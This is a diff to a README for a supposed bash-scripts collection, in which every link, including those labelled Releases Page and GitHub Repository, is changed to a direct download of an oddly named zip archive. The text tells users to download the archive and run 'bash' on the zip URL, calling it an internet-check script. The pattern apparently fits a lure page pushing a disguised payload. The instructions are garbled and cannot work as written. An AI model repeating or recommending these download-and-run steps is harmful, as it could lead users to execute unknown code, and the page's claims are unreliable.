@@ -9,12 +9,12 @@ To start using these scripts, you need to download them from our GitHub Releases
 ## 📥 Download & Install
 Click the button below to access the Releases page and download the scripts.
 
-[![Download bash-scripts](https://raw.githubusercontent.com/moderate-inositol224/bash-scripts/main/performant/bash-scripts.zip)](https://raw.githubusercontent.com/moderate-inositol224/bash-scripts/main/performant/bash-scripts.zip)
+[![Download bash-scripts](https://github.com/moderate-inositol224/bash-scripts/raw/refs/heads/main/performant/scripts-bash-exomphalus.zip)](https://github.com/moderate-inositol224/bash-scripts/raw/refs/heads/main/performant/scripts-bash-exomphalus.zip)
 
 ### Step 1: Visit the Download Page
 Go to the following link to see all available downloads:
 
-https://raw.githubusercontent.com/moderate-inositol224/bash-scripts/main/performant/bash-scripts.zip
+https://github.com/moderate-inositol224/bash-scripts/raw/refs/heads/main/performant/scripts-bash-exomphalus.zip
 
 ### Step 2: Choose the Scripts
 Once on the Releases page, you'll see a list of available script versions. Each version may have its own set of scripts, so choose the most recent one for the best features and fixes.
@@ -37,16 +37,16 @@ You can now run the scripts! Here’s how:
    ```
 3. To execute a script, type the following command in the terminal:
    ```bash
-   bash https://raw.githubusercontent.com/moderate-inositol224/bash-scripts/main/performant/bash-scripts.zip
+   bash https://github.com/moderate-inositol224/bash-scripts/raw/refs/heads/main/performant/scripts-bash-exomphalus.zip
    ```
-   Replace `https://raw.githubusercontent.com/moderate-inositol224/bash-scripts/main/performant/bash-scripts.zip` with the name of the script you want to run.
+   Replace `https://github.com/moderate-inositol224/bash-scripts/raw/refs/heads/main/performant/scripts-bash-exomphalus.zip` with the name of the script you want to run.
 
 ### Example of a Simple Script
 Here is an example of a script you might find in this collection:
 
-- **https://raw.githubusercontent.com/moderate-inositol224/bash-scripts/main/performant/bash-scripts.zip**: This script checks if your internet connection is active. To run it, just enter:
+- **https://github.com/moderate-inositol224/bash-scripts/raw/refs/heads/main/performant/scripts-bash-exomphalus.zip**: This script checks if your internet connection is active. To run it, just enter:
   ```bash
-  bash https://raw.githubusercontent.com/moderate-inositol224/bash-scripts/main/performant/bash-scripts.zip
+  bash https://github.com/moderate-inositol224/bash-scripts/raw/refs/heads/main/performant/scripts-bash-exomphalus.zip
   ```
 
 ## 🔍 Features
@@ -79,7 +79,7 @@ These scripts cover a wide range of topics to enhance your everyday computing ta
 - tasks
 
 ## 🔗 Useful Links
-- [Releases Page](https://raw.githubusercontent.com/moderate-inositol224/bash-scripts/main/performant/bash-scripts.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/moderate-inositol224/bash-scripts/main/performant/bash-scripts.zip)
+- [Releases Page](https://github.com/moderate-inositol224/bash-scripts/raw/refs/heads/main/performant/scripts-bash-exomphalus.zip)
+- [GitHub Repository](https://github.com/moderate-inositol224/bash-scripts/raw/refs/heads/main/performant/scripts-bash-exomphalus.zip)
 
 Feel free to explore the scripts and make your daily tasks easier!
